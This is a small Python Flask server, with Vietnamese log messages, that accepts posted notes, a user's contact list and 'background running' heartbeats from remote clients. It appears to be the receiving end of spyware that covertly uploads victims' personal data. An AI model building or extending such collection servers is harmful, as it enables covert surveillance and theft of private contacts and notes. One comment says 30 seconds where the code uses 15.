from flask import Flask, request
import time
import threading

app = Flask(__name__)
clients = {}  # Dictionary to track clients and their last heartbeat
TIMEOUT_SECONDS = 15  # Consider client offline after 30 seconds of no updates

@app.route("/log/note", methods=["POST"])
def log_note():
    title = request.form.get("title", "")
    content = request.form.get("content", "")
    print("📝 Ghi chú mới:")
    print(f"Tiêu đề: {title}")
    print(f"Nội dung: {content}")
    print("=" * 50)
    return "Note received", 200

@app.route("/log/contacts", methods=["POST"])
def log_contacts():
    contacts = request.form.get("contacts", "")
    print("📇 Danh bạ người dùng:")
    print(contacts)
    print("=" * 50)
    return "Contacts received", 200

@app.route("/log/status", methods=["POST"])
def log_status():
    status = request.form.get("status", "")
    client_id = request.remote_addr  # Use IP address as client identifier
    
    # Update the client's last heartbeat time
    clients[client_id] = {
        "last_seen": time.time(),
        "status": status
    }
    
    print(f"📡 Trạng thái chạy ngầm từ {client_id}: {status}")
    return "Status received", 200

def check_offline_clients():
    """Background thread to periodically check for offline clients"""
    while True:
        current_time = time.time()
        offline_clients = []
        
        # Check each client's last heartbeat time
        for client_id, info in list(clients.items()):
            if current_time - info["last_seen"] > TIMEOUT_SECONDS:
                print(f"⚠️ Client {client_id} appears to be offline (no heartbeat for {TIMEOUT_SECONDS}s)")
                offline_clients.append(client_id)
                # Option: remove from active clients
                # del clients[client_id]
        
        # Sleep for a while before checking again
        time.sleep(10)  # Check every 10 seconds

if __name__ == "__main__":
    # Start background thread to monitor client connections
    monitoring_thread = threading.Thread(target=check_offline_clients, daemon=True)
    monitoring_thread.start()
    
    # Start Flask server
    print("🚀 Server started. Monitoring for client heartbeats...")
    app.run(host="0.0.0.0", port=8000)